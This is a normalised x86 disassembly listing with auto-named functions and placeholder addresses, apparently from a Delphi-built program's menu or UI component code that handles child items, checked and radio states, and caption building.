inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_460810
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_460810
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_46098c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45de3c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45ed34
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_418d74
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_460c04
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_460800
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45ec64
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418cf8
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418cf8
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4607a4
sub_460a40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45de3c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_460800
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45ec64
mov eax ebx
call sub_460800
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418cf8
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418be8
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_460ab4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4606d8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4607e8
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4607e8
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_460b7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460800
mov edx eax
mov ecx esi
mov eax ebx
call sub_46098c
pop esi
pop ebx
retn
sub_460b98
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_460b64
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_460a40
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45de3c
sub_460bc0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_460c04
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_460c04
jmp r-xdata
mov eax ebx
call sub_45ec64
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4628dc
sub_460c5c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebx + 0x4c ] eax
sub_460c84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_40331c
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_460f18
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403518
mov edx ebx
mov eax edi
call sub_421b4c
mov eax ebx
mov si 0xffee
call sub_403518
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_460cf4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ esi + 0x4c ] eax
sub_460d28
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_460800
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_460810
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_460d68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_460b98
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_460b7c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_460b7c
sub_460dcc
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_460690
sub_460df8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_460668
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_4606d8
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_46072c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40416c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_460858
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4607a4
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_460834
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_460848
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_460f18
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4607e8
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403518
sub_460f3c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460f5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460f7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460f9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460fbc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460fdc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_460ffc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_46101c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_46103c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_46105c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_45b2b8
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_45b3f0
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_45b450
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_45b150
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_45b510
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4610d4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4607e8
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_460c84
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_461128
jmp r-xdata
xor edx edx
mov eax esi
call sub_45ebec
sub_461128
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_45c5c0
mov eax ebx
call sub_461198
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_421b4c
sub_461170
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_461170
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45e2c0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_460c04
mov eax ebx
pop esi
pop ebx
retn
sub_4611ac
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40ca64
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404678
sub_4611dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4041b0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_461260
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_461382
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4043d8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4043d8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404638
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404524
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461389
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4046c0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404498
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4043d8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404638
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404498
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_4613c0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46185f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4041b0
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_461820
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_460800
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4041b0
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461866
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40413c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x18 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
call sub_461a14
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_460810
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404524
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4611dc
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_460810
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_460810
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
mov eax [ ebp - 0x20 ]
call sub_40331c
mov eax [ ebp - 0x14 ]
call sub_40331c
mov eax [ ebp - 0xc ]
call sub_40331c
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_4611dc
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4043d8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_460810
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_4632b8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_408064
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40416c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40ca64
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40ca64
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_460810
push eax
mov edx esi
mov eax ebx
call sub_460810
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404638
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_408064
push ebp
mov eax [ ebp - 0x2c ]
call sub_4611ac
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_4611ac
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40ca64
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4041b0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_460810
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_460810
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_463224
mov edx [ ebp - 0x40 ]
pop eax
call sub_40416c
mov edx esi
mov eax ebx
call sub_460810
push eax
mov edx esi
mov eax ebx
call sub_460810
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404638
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_461260
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404678
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4046c0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_461260
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4618bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_460800
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_460800
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_461a40
test al al
je r-xdata
mov eax esi
call sub_460800
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_460810
call sub_461898
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_460810
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_460810
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_460810
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_460810
call sub_461898
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_460810
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_460810
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_460810
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_460810
call sub_461898
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_461a14
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_461a14
and eax 0x7f
mov al [ eax + rw-data ]
sub_461a40
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_461a40
and eax 0x7f
mov al [ eax + rw-data ]
sub_461a6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
